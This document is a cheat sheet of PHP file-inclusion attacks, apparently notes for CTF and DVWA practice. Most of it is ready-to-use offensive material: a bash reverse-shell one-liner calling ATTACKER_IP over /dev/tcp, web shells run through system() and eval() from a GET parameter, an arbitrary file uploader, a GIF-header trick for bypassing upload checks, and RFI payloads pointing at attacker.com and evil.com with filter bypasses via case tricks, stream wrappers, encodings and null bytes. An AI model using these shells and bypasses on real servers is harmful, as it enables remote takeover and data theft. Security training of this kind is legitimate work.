# LFI, RFI

## LFI, RFI (LOCAL FILE INCLUSION, REMOTE FILE INCLUSION)

***

## 🐘 PHP Superglobals + Functions Cheatsheet

***

### 🔑 PHP Superglobals

| Superglobal | What it Stores                                         | Example                       |
| ----------- | ------------------------------------------------------ | ----------------------------- |
| `$_GET`     | Data from URL query (`?id=1`)                          | `$_GET['id']`                 |
| `$_POST`    | Data from forms (POST method)                          | `$_POST['username']`          |
| `$_COOKIE`  | Browser cookies                                        | `$_COOKIE['PHPSESSID']`       |
| `$_FILES`   | Uploaded files                                         | `$_FILES['file']['name']`     |
| `$_SERVER`  | Server & client info (headers, IPs, script name, etc.) | `$_SERVER['HTTP_USER_AGENT']` |
| `$_REQUEST` | GET + POST + COOKIE combined                           | `$_REQUEST['q']`              |
| `$_SESSION` | Session variables                                      | `$_SESSION['user']`           |
| `$_ENV`     | Environment variables                                  | `$_ENV['PATH']`               |
| `$GLOBALS`  | All global variables                                   | `$GLOBALS['var']`             |
|             |                                                        |                               |

***

### ⚡ Important Functions for Hacking

#### 🔎 Info Gathering

* `phpinfo()` → Dumps server info/configs
* `getcwd()` → Current working directory
* `scandir('.')` → List files in directory

***

#### 💻 Command Execution

* `system($cmd)` → Executes + prints output (line by line)
* `exec($cmd)` → Executes, returns last line (needs var to capture all)
* `shell_exec($cmd)` → Executes, returns **entire output**
* `passthru($cmd)` → Executes, displays raw output (binary too)

***

#### 🐚 Dangerous PHP

* `eval($php_code)` → Executes PHP code string
* `assert($php_code)` → Similar to eval()
* `preg_replace('/.*/e', ...)` → (old trick, code execution)

***

#### 📂 File Handling

* `include($file)` → Includes a file
* `require($file)` → Like include but fatal error on fail
* `file_get_contents($f)` → Reads file into string
* `highlight_file($f)` → Shows PHP source highlighted

***

#### 🔐 Useful for Exploits

* `md5()` / `sha1()` → Hashing (password checks)
* `base64_encode()` / `base64_decode()` → Obfuscation tricks
* `serialize()` / `unserialize()` → PHP Object Injection target

***

✅ With these you can:

1. Collect info → `phpinfo(), $_SERVER, scandir()`
2. Execute code → `system(), shell_exec(), eval()`
3. Exploit inclusion → `include(), require()`
4. Steal/modify data → `$_COOKIE, $_SESSION, file_get_contents()`

***

### 🔑 Important PHP Codes

***

#### 1. **Reverse Shell (classic one-liner)**

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'"); ?>

```

➡ Gives you a reverse shell back to your listener (`nc -lvnp PORT`).

Replace `ATTACKER_IP` with your IP.

***

#### 2. **PHP Info**

```php
<?php phpinfo(); ?>

```

➡ Displays full server configuration (extensions, versions, `allow_url_include`, open\_basedir, etc.).

Very useful for **enumeration**.

***

#### 3. **Web Shell (Command Execution)**

```php
<?php system($_GET['cmd']); ?>

```

➡ Run commands by appending `?cmd=ls` in the URL.

(You can also replace `system` with `exec`, `shell_exec`, or `passthru`.)

***

#### 4. **File Upload Test (Webshell)**

```php
<?php echo "File uploaded!"; ?>

```

➡ Simple PHP test payload to check if upload worked (before putting full shell).

***

#### 5. **File Browser / Uploader**

```php
<?php
if(isset($_FILES['file'])){
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
}
?>

```

➡ Upload arbitrary files once you find an upload form.

***

#### 6. **Read Source Code**

```php
<?php echo highlight_file('index.php', true); ?>

```

➡ Displays source code of `index.php` with syntax highlighting.

Great for **LFI to RFI** exploitation.

***

#### 7. **Include Vulnerability Demo**

```php
<?php include($_GET['page']); ?>

```

➡ Classic **LFI/RFI vulnerable code**.

***

#### 8. **PHP Reverse Shell (PentestMonkey famous script)**

Longer version, but very useful in real pentests:

[PentestMonkey PHP Reverse Shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)

***

## ⚡ Bonus Tricks

* **Eval backdoor (dangerous)**:

```php
<?php eval($_GET['cmd']); ?>

```

Runs PHP code directly, not system commands.

Example: `?cmd=echo "Hello";`

* **Bypass file upload (GIF header trick)**:

```
GIF89a;
<?php system($_GET['cmd']); ?>

```

➡ Saves as `.gif`, but still executes if parsed as PHP.

***

📌 **Pro tip for CTFs/DVWA**:

If you can upload files → always try `phpinfo()` first (to know the environment), then drop a **command execution shell**, and finally upgrade it into a **reverse shell**.

***

***

## RCE TESTING

Whether `allow_url_include` is **ON** or **OFF** decides if you can do **Remote File Inclusion (RFI)** or not.

Here are the ways to check:

***

#### 🔎 1. Using `phpinfo()`

If you can upload or execute PHP code, create a file like:

```php
<?php phpinfo(); ?>

```

Open it in the browser → it will show the full PHP configuration.

Search for:

```
allow_url_include

```

* `On` ✅ → You can include remote URLs.
* `Off` ❌ → Only local files can be included.

***

#### 🔎 2. Using `ini_get()`

You can test with:

```php
<?php
echo ini_get("allow_url_include");
?>

```

* If it prints `1` → enabled.
* If it prints nothing/empty → disabled.

***

#### 🔎 3. Indirect Testing (Black-Box, No Code Execution Yet)

If you’re attacking and can only control the `?page=` parameter:

*   Try:

    ```
    http://target.com/index.php?page=http://attacker.com/shell.txt

    ```
* On your attacker machine (say with Python’s SimpleHTTPServer or PHP server), check your logs.
* If you see the server requesting your file, it means the target tried to fetch it.
* If it executes the PHP code inside, then **RFI is possible**.

If it only fetches but doesn’t execute, then `allow_url_fopen` may be ON, but `allow_url_include` is OFF.

***

✅ **Summary:**

* `allow_url_include` controls whether you can include remote PHP files.
* Easiest way: `phpinfo()` or `ini_get()`.
* As an attacker: try to include a URL and monitor if your server gets a request.

***

## Sensitive Case Filters, Wrappers, Nulls

When developers try to filter `http://`, attackers look for **alternatives**.

Here are the common **alternates of `http://`** that can bypass filters:

***

### 1. `https://`

If the code only removes `http://` but not `https://`:

```php
$file1 = "https://evil.com/shell.txt";

```

✅ Still works.

***

### 2. Case variations

PHP string functions like `str_replace()` are **case-sensitive**.

So if they filter `http://` exactly, you can use:

* `HTTP://`
* `HtTp://`
* `hTtP://`

✅ All bypass unless the developer uses a case-insensitive function (`str_ireplace()`).

***

### 3. Other stream wrappers

PHP allows different "protocols" (wrappers) besides `http://`. Examples:

* `ftp://evil.com/shell.txt`
* `php://filter` (used to read source code, e.g. `php://filter/convert.base64-encode/resource=index.php`)
* `data://text/plain;base64,...` (inline payloads)

✅ These often bypass weak filters.

***

### 4. Encodings

If the filter checks raw `http://`, you can encode it:

* URL encoded: `h%74tp://`
* Double URL encoded: `h%2574tp://`
* Using null bytes (`http://%00evil.com`) in old PHP versions.

***

### 5. Using `//` shorthand

Browsers accept `//example.com` (protocol-relative URL).

PHP might also handle it depending on context:

```php
include("//evil.com/shell.txt");

```

***

🚨 **Hacker lesson:**

When you see filtering like this:

```php
$file = str_replace("http://", "", $_GET['page']);
include($file);

```

…it’s usually weak. You should try `https://`, mixed case, or another wrapper.

***
